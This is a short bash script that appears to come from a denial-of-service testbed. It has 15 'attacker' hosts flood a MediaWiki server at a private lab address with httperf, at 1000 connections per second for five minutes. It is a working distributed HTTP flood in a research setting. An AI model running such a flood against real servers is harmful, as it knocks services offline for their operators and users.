# How to run #
#Example: bash start-httperf.sh wikipedia wiki#

#========Stop if any existing instance running=========#
i=1
while [ $i -le 15 ] ; do
  ssh attacker$i.$2-testing.frade "sudo pkill -9 httperf"

  i=$(($i+1))
done

sleep 15

#========Start httperf on 15 attackers=========#
i=1
while [ $i -le 15 ] ; do
  ssh attacker$i.$2-testing.frade "sudo httperf --server=10.1.1.2 --uri=/mediawiki/index.php --num-conns=1000000 --rate=1000 --hog" &
  
  i=$(($i+1))
done

sleep 300

#========Stop httperf on 15 attackers=========#
i=1
while [ $i -le 15 ] ; do
  ssh attacker$i.$2-testing.frade "sudo pkill -9 httperf"

  i=$(($i+1))
done

